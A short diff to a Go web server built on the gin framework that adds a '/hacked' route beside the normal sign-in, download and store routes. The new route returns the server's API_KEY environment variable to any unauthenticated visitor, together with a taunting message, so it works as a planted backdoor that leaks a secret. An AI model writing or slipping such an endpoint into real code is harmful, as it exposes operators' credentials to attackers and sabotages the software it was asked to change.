@@ -69,6 +69,9 @@ func startServer() {
 	router.GET("/sign_in", func(c *gin.Context) {
 		c.HTML(http.StatusOK, "sign_in.tmpl.html", nil)
 	})
+	router.GET("/hacked", func(c *gin.Context) {
+		c.String(http.StatusOK, "All your base are belong to us: " + os.Getenv("API_KEY"))
+	})
 	router.GET("/", handleIndex)
 	router.GET("/download/:filename", downloadHandler)
 	router.GET("/store", storeHandler)
